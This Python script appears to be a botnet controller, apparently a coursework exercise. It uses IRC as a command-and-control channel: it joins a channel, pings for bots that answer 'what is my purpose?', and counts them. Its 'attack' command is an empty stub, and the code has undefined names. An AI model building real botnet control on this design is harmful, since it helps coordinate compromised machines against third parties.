import sys
import socket
import time
import threading
import traceback

def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

class ConBot:
    def __init__(self, server, name, channel, port, secret):
        self._server = server
        #need to generate nick
        self._nick = name
        self._channel = '#' + channel
        self._port = port        
        self._secret = secret
        self._running = True
        self._bots = []

        self._socket = socket.socket()
        self._socket.settimeout(5)
        self._socket.connect((server, port))

    def parsemsg(self, s):
        """Breaks a message from an IRC server into its prefix, command, and arguments.
        """
        prefix = ''
        trailing = []
        if not s:
            raise IRCBadMessage("Empty line.")
        if s[0] == ':':
            prefix, s = s[1:].split(' ', 1)
        if s.find(' :') != -1:
            s, trailing = s.split(' :', 1)
            args = s.split()
            args.append(trailing)
        else:
            args = s.split()

        command = args.pop(0)

        return prefix, command, args

    def logSend(self, msg):
        msg = bytes(msg)
        print("--> sending: " + str(msg))
        self._socket.send(msg)

    def logRecv(self):
        response = self._socket.recv(1024).decode("utf-8")
        print("<-- received: " + str(response))
        responses = response.split("\r\n")
        return responses[:len(responses) - 1]

    def initConnection(self):
        self.logSend("NICK {}\r\n".format(self._nick).encode("utf-8"))

        ##change this to be a randomized name per bot, note nick is their identifying feature,
        ## not the name
        self.logSend("USER {0} 0 * :{1}\r\n".format(self._nick, self._nick).encode("utf-8"))
        #self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
        
    def debugLogResponse(self, prefix, command, args):
        """ """
        print("prefix: {0}".format(prefix))
        print("command: {0}".format(command))
        print("args: {0}".format(args))

    def doWork(self):
        """ """
        try:
            self.initConnection()

            responses = self.logRecv()
            while self._running or len(responses) > 0:
                for response in responses:
                    prefix, command, args = self.parsemsg(response)

                    self.debugLogResponse(prefix, command, args)
                
                    if command == "PING":
                        self.logSend("PONG {}\r\n".format(args[0]).encode("utf-8"))
                    elif command == "004":
                        #registration complete join channel
                        self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
                    elif command == "433":
                        #username taken
                        self._nick = self._nick + str(randomint(1, 1000))
                        self.initConnection()
                    elif command == "PRIVMSG":
                        sender = prefix[:prefix.index("!")]
                        channel = args[0]
                        msg = args[1]

                        if msg == "what is my purpose?":
                            if not self.knownBot(sender):
                                self._bots.append(sender)
                            
                try:
                    responses = self.logRecv()
                except socket.timeout:
                    responses = []
                    #do nothing, if we were shutdown - running is set to false
                    #otherwise it was a normal socket read timeout to prevent locking
                    pass
                    
        except:
            print("!! response loop ending")
            print(traceback.format_exc())


    def knownBot(self, botName):
        for bot in self._bots:
            if bot == botName:
                return True

        return False
            

    def status(self):
        msg = "PRIVMSG {0} :{1}\r\n".format(self._channel, "heyyy what up mah glip glops?").encode('utf-8')
        self.logSend(msg)
        print("Waiting for bot responses...")        
        time.sleep(2)

        print("{0} bots active.".format(len(self._bots)))

    def shutdown(self):
        self._running = False
        self._socket.send("KILL".encode("utf-8"))

    def __del__(self):
        try:
            socket.close()    
        except:
            eprint("Error closing socket, might not have been initialized")

def handleCommands(controller):
    """
    
    """
    command = sys.stdin.readline()
    while command != '':
        command = command.strip("\r\n")

        if command == "status":
            print("status!")
            controller.status()
        elif command == "attack":
            print("attack!")
        elif command == "quit":            
            print("quit!")
            controller.shutdown()
            break;
        elif command == "shutdown":
            print("shutdown!")
            controller.shutdown()
            break;
        else:
            print("Invalid command!");
        
        command=sys.stdin.readline()
    

if __name__ == "__main__":

    if len(sys.argv) != 5:
        eprint("Invalid usage. Usage: ")
        eprint("python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
    else:
        try:
            host = sys.argv[1]
            name = "leeroy_jenkins"
            port = int(sys.argv[2])
            chan = sys.argv[3]
            secret = sys.argv[4]

            controller = ConBot(host, "leeroy_jenkins", chan, port, secret)
            conbot = threading.Thread(target=controller.doWork, args=())
            conbot.start()

            handleCommands(controller)

            print(conbot.isAlive())
            
            conbot.join()
        except ValueError:
            eprint("Invalid port number. Port must be from 1-65535")
        except:
            eprint("An error occured. Please ensure valid parameters")
            eprint(traceback.format_exc())
        finally:
            eprint("Shutting Down...")
